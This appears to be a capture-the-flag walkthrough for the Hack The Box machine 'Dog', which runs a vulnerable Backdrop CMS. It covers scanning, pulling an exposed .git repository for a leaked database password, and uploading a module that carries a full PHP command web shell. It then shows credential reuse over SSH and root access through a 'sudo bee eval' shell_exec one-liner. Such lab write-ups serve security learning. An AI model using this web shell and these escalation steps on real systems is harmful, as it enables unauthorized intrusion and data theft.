### dog.htb
#### https://app.hackthebox.com/machines/651
---

Walkthrough: Dog HTB

As always, we start by scanning the machine with **Nmap**
```
Hexada@hexada ~/docker_volume/web-security$ sudo nmap -sS -sC -sV -p- -T5 --max-rate 10000 -oN dog.txt 10.10.11.58                                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 22:26 EET
Nmap scan report for dog.htb (10.10.11.58)
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 355.62 seconds
```

We can see that the web server is managed via the **SSH protocol**, but I’m more interested in the `.git` directory. This directory contains the latest version of the back-end code that runs via **Apache**. If we find the hash of the last commit, we can use this unique hash to access the code version for analysis

I’m also interested in the 'robots.txt' file because it might contain useful information. Let's check it out

```
Hexada@hexada ~/docker_volume/web-security$ curl http://10.10.11.58/robots.txt                                                                                                             
#
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html
#
# For syntax checking, see:
# http://www.robotstxt.org/checker.html

User-agent: *
Crawl-delay: 10
# Directories
Disallow: /core/
Disallow: /profiles/
# Files
Disallow: /README.md
Disallow: /web.config
# Paths (clean URLs)
Disallow: /admin
Disallow: /comment/reply
Disallow: /filter/tips
Disallow: /node/add
Disallow: /search
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
# Paths (no clean URLs)
Disallow: /?q=admin
Disallow: /?q=comment/reply
Disallow: /?q=filter/tips
Disallow: /?q=node/add
Disallow: /?q=search
Disallow: /?q=user/password
Disallow: /?q=user/register
Disallow: /?q=user/login
Disallow: /?q=user/logout
```

The `robots.txt` file is used to manage access for search engines and other automated bots (called "spiders") that crawl websites. In this file, rules are defined that tell these bots which pages or directories they should not index or visit. This helps prevent unnecessary parts of the website from being indexed by search engines, which can save server resources or protect sensitive data from being indexed

```
root@docker-desktop:~/home/local/dog# gobuster dir -u http://10.10.11.58/.git -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.58/.git
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /root/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/03/22 14:11:15 Starting gobuster in directory enumeration mode
===============================================================
/info                 (Status: 301) [Size: 314] [--> http://10.10.11.58/.git/info/]
/index                (Status: 200) [Size: 344667]                                 
/config               (Status: 200) [Size: 92]                                     
/logs                 (Status: 301) [Size: 314] [--> http://10.10.11.58/.git/logs/]
/objects              (Status: 301) [Size: 317] [--> http://10.10.11.58/.git/objects/]
/description          (Status: 200) [Size: 73]                                        
/branches             (Status: 301) [Size: 318] [--> http://10.10.11.58/.git/branches/]
/refs                 (Status: 301) [Size: 314] [--> http://10.10.11.58/.git/refs/]    
/HEAD                 (Status: 200) [Size: 23]                                         
                                                                                       
===============================================================
2025/03/22 14:15:28 Finished
===============================================================
root@docker-desktop:~/home/local/dog#  
```

![image](https://github.com/user-attachments/assets/7b74b8e1-c77f-44ea-ac1d-61fe075c130c)
![image](https://github.com/user-attachments/assets/2d45c238-0d92-4a73-85ae-c8e1298ba2aa)
Here’s the hash I was talking about earlier

Let's get access to the commit

```
wget -r --no-parent http://dog.htb/.git/
```

I recommend using dirsearch to download the `.git`; it's more comfortable

I found out about this tool later, after I had solved all the flags

```
root@docker-desktop:~/home/local/dog/dog.htb/.git# git log --oneline --graph --all
* 8204779 (HEAD -> master) todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases
root@docker-desktop:~/home/local/dog/dog.htb/.git# git show --name-only 8204779c764abd4c9d8d95038b6d22b6a7515afa
commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)
Author: root <dog@dog.htb>
Date:   Fri Feb 7 21:22:11 2025 +0000

    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases

LICENSE.txt
README.md
core/.jshintignore
core/.jshintrc
core/authorize.php
core/cron.php
core/includes/actions.inc
core/includes/ajax.inc
core/includes/anonymous.inc
core/includes/archiver.inc
core/includes/authorize.inc
core/includes/batch.inc
core/includes/batch.queue.inc
core/includes/bootstrap.classes.inc
core/includes/bootstrap.inc
core/includes/cache-install.inc
core/includes/cache.inc
core/includes/color.inc
core/includes/common.inc
core/includes/config.inc
core/includes/database/charset_converter.inc
core/includes/database/database.inc
core/includes/database/log.inc
core/includes/database/mysql/database.inc
core/includes/database/mysql/install.inc
core/includes/database/mysql/query.inc
core/includes/database/mysql/schema.inc
core/includes/database/prefetch.inc
core/includes/database/query.inc
core/includes/database/schema.inc
core/includes/database/select.inc
core/includes/date.class.inc
core/includes/date.inc
core/includes/diff.inc
core/includes/drupal.classes.inc
core/includes/drupal.inc
core/includes/errors.inc
core/includes/evalmath.inc
core/includes/file.inc
core/includes/file.mimetypes.inc
--More--
```

We have successfully gained access to a commit, which represents a specific version of the web server. Now, our task is to analyze the files from this commit to find any useful information that may help us in the next steps

**CMS (Content Management System)** - It’s a program or web application that gives you the opportunity to create, edit, and manage website content without the need to write code manually

With a **CMS**, you can manage a website with a blog. For example, you can create, edit, and organize articles, upload images, and much more

Among the popular **CMS** options are **Backdrop**, **Backdrop**, **Joomla**, **Drupal** and many others

```
git show --name-only 8204779c764abd4c9d8d95038b6d22b6a7515afa:core/includes/bootstrap.inc

/**
 * The current system version.
 */
define('BACKDROP_VERSION', '1.27.1');
```

By analyzing the `bootstrap.inc` file inside the commit, we discovered that the installed **Backdrop** version is **1.27.1**

This particular version is known to be vulnerable to malicious code injection through the CMS itself, which allows us to execute arbitrary code or gain unauthorized access to the system, but for that, we need an account that has permissions to upload content to the website

```
git show --name-only 8204779c764abd4c9d8d95038b6d22b6a7515afa:settings.php

<?php
/
 * @file
 * Main Backdrop CMS configuration file.
 */

/
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

```
git show --name-only 8204779c764abd4c9d8d95038b6d22b6a7515afa:files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json

{
    "_config_name": "update.settings",
    "_config_static": true,
    "update_cron": 1,
    "update_disabled_extensions": 0,
    "update_interval_days": 0,
    "update_url": "",
    "update_not_implemented_url": "https://github.com/backdrop-ops/backdropcms.org/issues/22",
    "update_max_attempts": 2,
    "update_timeout": 30,
    "update_emails": [
        "tiffany@dog.htb"
    ],
    "update_threshold": "all",
    "update_requirement_type": 0,
    "update_status": [],
    "update_projects": []
}
```

If we use this username and password, we can gain access to this account, which is suitable for our aim

![image](https://github.com/user-attachments/assets/c6d2fadf-5a33-4dd0-a77c-b22b8b65d3fd)
![image](https://github.com/user-attachments/assets/42832650-8cf6-4dd2-8782-d146c92bab1b)
![image](https://github.com/user-attachments/assets/94366bfa-6628-4daf-a2f7-17c91e2c0ef2)
![image](https://github.com/user-attachments/assets/93463e01-37c8-4b8c-9092-4fb14684ef59)

https://www.exploit-db.com/exploits/52021


The issue with **Backdrop CMS version 1.27.1** is that it has bad validation of files inside module archive uploads and does not implement sandboxing mechanisms. This allows attackers to inject malicious code, which can then be executed when accessing the file at `http://dog.htb/modules/shell/shell.php`


```
(myenv) Hexada@hexada ~/app/vrm/dog$ python3 52021.py http://10.10.11.58                                         
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php
(myenv) Hexada@hexada ~/app/vrm/dog$
```

Edit the `shell/shell.php` file and insert your malicious code. For example

```
shell/shell.php

<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

<html>
<body>
<form method="GET">
<label for="cmd">Enter command:</label>
<input type="text" name="cmd" id="cmd" size="60" autofocus>
<input type="submit" value="Execute">
</form>
</body>
</html>
```

Next, archive the files into a `.tar` file:

```
Hexada@hexada ~/app/vrm/dog$ tar -cvf shell.tar shell/                                                           
shell/
shell/shell.info
shell/shell.php
```

Once the archive is created, inject your malicious code into the `shell.php` file

![image](https://github.com/user-attachments/assets/91421d76-7e2e-4b3f-9b09-e5ebae8cce83)

for convenience, I connect via reverse shell

![image](https://github.com/user-attachments/assets/4b886c3e-0a72-4798-96cc-2bf08be9aaa5)

it would be helpful to see account information

```
www-data@dog:/home/johncusack$ cat /etc/passwd

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

```
www-data@dog:/home$ ls
ls
jobert
johncusack
```

Both `jobert` and `johncusack` have home directories under `/home`, confirming that they are interactive users. Since we previously found a **SQL database** password in `settings.php`, it’s worth trying this password to connect to these accounts via **SSH**

From the list of users, i think we should try connecting via **SSH** using the **SQL** password retrieved from `settings.php`

```
Hexada@hexada ~/app/vrm/dog$ ssh jobert@dog.htb                                                                  
jobert@dog.htb's password: 
Permission denied, please try again.
jobert@dog.htb's password: 
```

Now, let's try to connect via `johncusack`

```
Hexada@hexada ~/app/vrm/dog$ ssh johncusack@10.10.11.58                                                   130 ↵  
johncusack@10.10.11.58's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 08 Apr 2025 11:10:23 AM UTC

  System load:           0.09
  Usage of /:            59.9% of 6.32GB
  Memory usage:          27%
  Swap usage:            0%
  Processes:             234
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.58
  IPv6 address for eth0: dead:beef::250:56ff:fe94:8e38


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

johncusack@dog:~$ cat user.txt
255e46faea7f39241427******
```

Nice, we did it

```
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

```
johncusack@dog:~$ /usr/local/bin/bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.

 --base-url
 Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.

 --yes, -y
 Answer 'yes' to questions without prompting.

 --debug, -d
 Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).


Commands:
 CONFIGURATION
  config-export
   cex, bcex
   Export config from the site.

  config-get
   cget
   Get the value of a specific config option, or view all the config options in a given file.

  config-import
   cim, bcim
   Import config into the site.

  config-set
   cset
   Set the value of an option in a config file.

 CORE
  download-core
   dl-core
   Download Backdrop core.

  install
   si, site-install
   Install Backdrop and setup a new site.

 DATABASE
  db-drop
   sql-drop
   Drop the current database and recreate an empty database with the same details. This could be used prior to import if the target database has more tables than the source database.

  db-export
   dbex, db-dump, sql-export, sql-dump
   Export the database as a compressed SQL file. This uses the --no-tablespaces option by default.

  db-import
   dbim, sql-import
   Import an SQL file into the current database.

 INFORMATION
  help
   Provide help and examples for 'bee' and its commands.

  log
   ws, dblog, watchdog-show
   Show database log messages.

  status
   st, info, core-status
   Provides an overview of the current Backdrop installation/site.

  version
   Display the current version of Bee.

 MISCELLANEOUS
  cache-clear
   cc
   Clear a specific cache, or all Backdrop caches.

  cron
   Run cron.

  maintenance-mode
   mm
   Enable or disable maintenance mode for Backdrop.

 PROJECTS
  disable
   dis, pm-disable
   Disable one or more projects (modules, themes, layouts).

  download
   dl, pm-download
   Download Backdrop contrib projects.

  enable
   en, pm-enable
   Enable one or more projects (modules, themes, layouts).

  projects
   pml, pmi, project, pm-list, pm-info
   Display information about available projects (modules, themes, layouts).

  uninstall
   pmu, pm-uninstall
   Uninstall one or more modules.

 ROLES
  permissions
   pls, permissions-list
   List all permissons of the modules.

  role-add-perm
   rap
   Grant specified permission(s) to a role.

  role-create
   rcrt
   Add a role.

  role-delete
   rdel
   Delete a role.

  role-remove-perm
   rrp
   Remove specified permission(s) from a role.

  roles
   rls, roles-list
   List all roles with the permissions.

 STATE
  state-get
   sg, sget
   Get the value of a Backdrop state.

  state-set
   ss, sset
   Set the value of an existing Backdrop state.

 THEMES
  theme-admin
   admin-theme
   Set the admin theme.

  theme-default
   default-theme
   Set the default theme.

 UPDATE
  update-db
   updb, updbst, updatedb, updatedb-status
   Show, and optionally apply, all pending database updates.

 USERS
  user-add-role
   urole, urol
   Add role to user.

  user-block
   ublk
   Block a user.

  user-cancel
   ucan
   Cancel/remove a user.

  user-create
   ucrt
   Create a user account with the specified name.

  user-login
   uli
   Display a login link for a given user.

  user-password
   upw, upwd
   Reset the login password for a given user.

  user-remove-role
   urrole, urrol
   Remove a role from a user.

  user-unblock
   uublk
   Unblock a user.

  users
   uls, user-list
   List all user accounts.

 ADVANCED
  db-query
   dbq
   Execute a query using db_query().

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop's database credentials.
```

```
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"
503134386e6c68c2b******
johncusack@dog:~$ 
```
